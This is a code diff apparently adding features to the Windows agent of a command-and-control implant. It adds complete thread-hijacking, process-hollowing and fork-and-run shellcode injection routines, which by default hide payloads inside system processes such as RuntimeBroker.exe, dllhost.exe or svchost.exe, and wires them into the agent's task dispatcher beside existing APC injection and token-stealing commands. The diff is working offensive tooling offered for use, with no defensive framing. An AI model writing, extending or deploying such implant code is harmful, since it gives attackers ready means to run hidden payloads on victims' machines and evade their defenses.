@@ -341,6 +341,133 @@ static char *inject_apc(int pid, const uint8_t *sc, size_t sc_len) {
     return out;
 }
 
+// ── Thread hijack injection ───────────────────────────────────────────────────
+
+static char *thread_hijack(DWORD pid, const uint8_t *sc, size_t sc_len) {
+    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+    if (!hProc) { char *e=(char*)malloc(64); snprintf(e,64,"OpenProcess failed (err %lu)",GetLastError()); return e; }
+    LPVOID mem = VirtualAllocEx(hProc, NULL, sc_len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
+    if (!mem) { CloseHandle(hProc); char *e=(char*)malloc(64); snprintf(e,64,"VirtualAllocEx failed (err %lu)",GetLastError()); return e; }
+    SIZE_T written = 0;
+    WriteProcessMemory(hProc, mem, sc, sc_len, &written);
+    DWORD old; VirtualProtectEx(hProc, mem, sc_len, PAGE_EXECUTE_READ, &old);
+    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+    if (snap == INVALID_HANDLE_VALUE) { CloseHandle(hProc); return strdup("Toolhelp snapshot failed"); }
+    THREADENTRY32 te; te.dwSize = sizeof(te);
+    DWORD targetTID = 0;
+    if (Thread32First(snap, &te)) {
+        do { if (te.th32OwnerProcessID == pid) { targetTID = te.th32ThreadID; break; } }
+        while (Thread32Next(snap, &te));
+    }
+    CloseHandle(snap);
+    if (!targetTID) { CloseHandle(hProc); char *e=(char*)malloc(64); snprintf(e,64,"no thread in PID %lu",pid); return e; }
+    HANDLE ht = OpenThread(THREAD_ALL_ACCESS, FALSE, targetTID);
+    if (!ht) { CloseHandle(hProc); char *e=(char*)malloc(64); snprintf(e,64,"OpenThread failed (err %lu)",GetLastError()); return e; }
+    SuspendThread(ht);
+    CONTEXT ctx; memset(&ctx, 0, sizeof(ctx));
+    ctx.ContextFlags = CONTEXT_CONTROL;
+    if (GetThreadContext(ht, &ctx)) { ctx.Rip = (DWORD64)mem; SetThreadContext(ht, &ctx); }
+    ResumeThread(ht); CloseHandle(ht); CloseHandle(hProc);
+    char *out = (char*)malloc(128);
+    snprintf(out, 128, "[+] thread %lu hijacked in PID %lu (%zu B)", (unsigned long)targetTID, (unsigned long)pid, sc_len);
+    return out;
+}
+
+// ── Process hollow ────────────────────────────────────────────────────────────
+
+static char *do_hollow(const char *target, const uint8_t *pe, size_t pe_len) {
+    if (pe_len < 0x40) return strdup("[error: payload too small]");
+    DWORD pe_off; memcpy(&pe_off, pe + 0x3C, 4);
+    if (pe_off + sizeof(IMAGE_NT_HEADERS64) > pe_len) return strdup("[error: e_lfanew OOB]");
+    const IMAGE_NT_HEADERS64 *nt = (const IMAGE_NT_HEADERS64 *)(pe + pe_off);
+    if (nt->Signature != IMAGE_NT_SIGNATURE) return strdup("[error: not a PE]");
+    if (nt->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64) return strdup("[error: not AMD64]");
+    DWORD entry_rva     = nt->OptionalHeader.AddressOfEntryPoint;
+    DWORD64 pref_base   = nt->OptionalHeader.ImageBase;
+    DWORD size_of_image = nt->OptionalHeader.SizeOfImage;
+    DWORD size_of_hdrs  = nt->OptionalHeader.SizeOfHeaders;
+    WORD  num_sec       = nt->FileHeader.NumberOfSections;
+    WORD  opt_sz        = nt->FileHeader.SizeOfOptionalHeader;
+    char tgt[MAX_PATH] = {0};
+    if (target && target[0]) {
+        strncpy(tgt, target, MAX_PATH-1);
+    } else {
+        char sys[MAX_PATH]; GetSystemDirectoryA(sys, MAX_PATH);
+        snprintf(tgt, MAX_PATH, "%s\\RuntimeBroker.exe", sys);
+        if (GetFileAttributesA(tgt) == INVALID_FILE_ATTRIBUTES)
+            snprintf(tgt, MAX_PATH, "%s\\dllhost.exe", sys);
+        if (GetFileAttributesA(tgt) == INVALID_FILE_ATTRIBUTES)
+            snprintf(tgt, MAX_PATH, "%s\\svchost.exe", sys);
+    }
+    WCHAR tgt_w[MAX_PATH];
+    MultiByteToWideChar(CP_ACP, 0, tgt, -1, tgt_w, MAX_PATH);
+    STARTUPINFOW si; memset(&si, 0, sizeof(si)); si.cb = sizeof(si);
+    PROCESS_INFORMATION pi; memset(&pi, 0, sizeof(pi));
+    if (!CreateProcessW(NULL, tgt_w, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
+        char *e=(char*)malloc(128); snprintf(e,128,"CreateProcessW(%s) failed (err %lu)",tgt,GetLastError()); return e;
+    }
+    LPVOID base = VirtualAllocEx(pi.hProcess, (LPVOID)pref_base, size_of_image,
+                                  MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!base) base = VirtualAllocEx(pi.hProcess, NULL, size_of_image,
+                                      MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!base) { TerminateProcess(pi.hProcess,1); CloseHandle(pi.hThread); CloseHandle(pi.hProcess); return strdup("VirtualAllocEx failed"); }
+    SIZE_T wr;
+    DWORD hdr_sz = (size_of_hdrs < (DWORD)pe_len) ? size_of_hdrs : (DWORD)pe_len;
+    WriteProcessMemory(pi.hProcess, base, pe, hdr_sz, &wr);
+    const IMAGE_SECTION_HEADER *secs = (const IMAGE_SECTION_HEADER *)(pe + pe_off + 4 + sizeof(IMAGE_FILE_HEADER) + opt_sz);
+    for (int i = 0; i < num_sec; i++) {
+        DWORD virt_rva = secs[i].VirtualAddress;
+        DWORD raw_size = secs[i].SizeOfRawData;
+        DWORD raw_off  = secs[i].PointerToRawData;
+        if (!raw_size || !raw_off || raw_off + raw_size > (DWORD)pe_len) continue;
+        WriteProcessMemory(pi.hProcess, (LPVOID)((DWORD64)base + virt_rva), pe + raw_off, raw_size, &wr);
+    }
+    DWORD64 ep = (DWORD64)base + entry_rva;
+    CONTEXT ctx; memset(&ctx, 0, sizeof(ctx)); ctx.ContextFlags = CONTEXT_CONTROL;
+    if (GetThreadContext(pi.hThread, &ctx)) { ctx.Rip = ep; SetThreadContext(pi.hThread, &ctx); }
+    ResumeThread(pi.hThread);
+    CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
+    char *out = (char*)malloc(256);
+    snprintf(out, 256, "[+] hollow: %s PID=%lu base=0x%llx entry=0x%llx",
+             tgt, (unsigned long)pi.dwProcessId, (unsigned long long)(DWORD64)base, (unsigned long long)ep);
+    return out;
+}
+
+// ── Fork-and-run (shellcode in sacrificial process) ───────────────────────────
+
+static char *fork_run(const char *cmd, const uint8_t *sc, size_t sc_len) {
+    char proc_path[MAX_PATH] = {0};
+    if (cmd && cmd[0]) {
+        strncpy(proc_path, cmd, MAX_PATH-1);
+    } else {
+        char sys[MAX_PATH]; GetSystemDirectoryA(sys, MAX_PATH);
+        snprintf(proc_path, MAX_PATH, "%s\\RuntimeBroker.exe", sys);
+        if (GetFileAttributesA(proc_path) == INVALID_FILE_ATTRIBUTES)
+            snprintf(proc_path, MAX_PATH, "%s\\dllhost.exe", sys);
+        if (GetFileAttributesA(proc_path) == INVALID_FILE_ATTRIBUTES)
+            snprintf(proc_path, MAX_PATH, "%s\\svchost.exe", sys);
+    }
+    WCHAR proc_w[MAX_PATH];
+    MultiByteToWideChar(CP_ACP, 0, proc_path, -1, proc_w, MAX_PATH);
+    STARTUPINFOW si; memset(&si, 0, sizeof(si)); si.cb = sizeof(si);
+    PROCESS_INFORMATION pi; memset(&pi, 0, sizeof(pi));
+    if (!CreateProcessW(NULL, proc_w, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
+        char *e=(char*)malloc(128); snprintf(e,128,"CreateProcessW(%s) failed (err %lu)",proc_path,GetLastError()); return e;
+    }
+    LPVOID mem = VirtualAllocEx(pi.hProcess, NULL, sc_len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
+    if (!mem) { TerminateProcess(pi.hProcess,1); CloseHandle(pi.hThread); CloseHandle(pi.hProcess); return strdup("VirtualAllocEx failed"); }
+    SIZE_T wr;
+    WriteProcessMemory(pi.hProcess, mem, sc, sc_len, &wr);
+    DWORD old; VirtualProtectEx(pi.hProcess, mem, sc_len, PAGE_EXECUTE_READ, &old);
+    CONTEXT ctx; memset(&ctx, 0, sizeof(ctx)); ctx.ContextFlags = CONTEXT_CONTROL;
+    if (GetThreadContext(pi.hThread, &ctx)) { ctx.Rip = (DWORD64)mem; SetThreadContext(pi.hThread, &ctx); }
+    ResumeThread(pi.hThread);
+    CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
+    char *out = (char*)malloc(192);
+    snprintf(out, 192, "[+] fork-run: %zu B shellcode in %s (PID=%lu)", sc_len, proc_path, (unsigned long)pi.dwProcessId);
+    return out;
+}
+
 // ── Token operations ──────────────────────────────────────────────────────────
 
 static int enable_privilege(HANDLE hToken, const char *priv_name) {
@@ -1243,6 +1370,33 @@ void dispatch_task(AgentTask *task) {
         int pid = json_get_int(args, "pid", 0);
         if (!pid) { agent_send_result(task->id, "", "INJECT_APC requires {\"pid\":N}"); return; }
         char *out = inject_apc(pid, task->payload, task->payload_len);
+        agent_send_result(task->id, out, ""); free(out);
+    }
+    else if (strcmp(type_upper, "THREAD_HIJACK") == 0) {
+        if (!task->payload || task->payload_len == 0) {
+            agent_send_result(task->id, "", "THREAD_HIJACK: no shellcode payload"); return;
+        }
+        int pid = json_get_int(args, "pid", 0);
+        if (!pid) { agent_send_result(task->id, "", "THREAD_HIJACK requires {\"pid\":N}"); return; }
+        char *out = thread_hijack((DWORD)pid, task->payload, task->payload_len);
+        agent_send_result(task->id, out, ""); free(out);
+    }
+    else if (strcmp(type_upper, "HOLLOW") == 0) {
+        if (!task->payload || task->payload_len == 0) {
+            agent_send_result(task->id, "", "HOLLOW: no PE payload"); return;
+        }
+        char tgt[MAX_PATH] = {0};
+        json_get_str(args, "target", tgt, sizeof(tgt), "");
+        char *out = do_hollow(tgt[0] ? tgt : NULL, task->payload, task->payload_len);
+        agent_send_result(task->id, out, ""); free(out);
+    }
+    else if (strcmp(type_upper, "FORK_RUN") == 0) {
+        if (!task->payload || task->payload_len == 0) {
+            agent_send_result(task->id, "", "FORK_RUN: no shellcode payload"); return;
+        }
+        char cmd[MAX_PATH] = {0};
+        json_get_str(args, "cmd", cmd, sizeof(cmd), "");
+        char *out = fork_run(cmd[0] ? cmd : NULL, task->payload, task->payload_len);
         agent_send_result(task->id, out, ""); free(out);
     }
     else if (strcmp(type_upper, "TOKEN_STEAL") == 0) {
@@ -3029,6 +3183,16 @@ void dispatch_task(AgentTask *task) {
     }
     else if (strcmp(type_upper, "PIPE_START") == 0 || strcmp(type_upper, "PIPE_STOP") == 0) {
         agent_send_result(task->id, "", "PIPE_START/STOP: not yet implemented in C agent");
+    }
+    else if (strcmp(type_upper, "PORTFWD_ADD") == 0 ||
+             strcmp(type_upper, "PORTFWD_DEL") == 0 ||
+             strcmp(type_upper, "PORTFWD_LIST") == 0) {
+        agent_send_result(task->id, "", "PORTFWD: not yet implemented in C agent");
+    }
+    else if (strcmp(type_upper, "BOF_STORE_LOAD") == 0 ||
+             strcmp(type_upper, "BOF_STORE_LIST") == 0 ||
+             strcmp(type_upper, "BOF_STORE_UNLOAD") == 0) {
+        agent_send_result(task->id, "", "BOF_STORE: not yet implemented in C agent");
     }
 #endif /* _WIN32 */
     else {
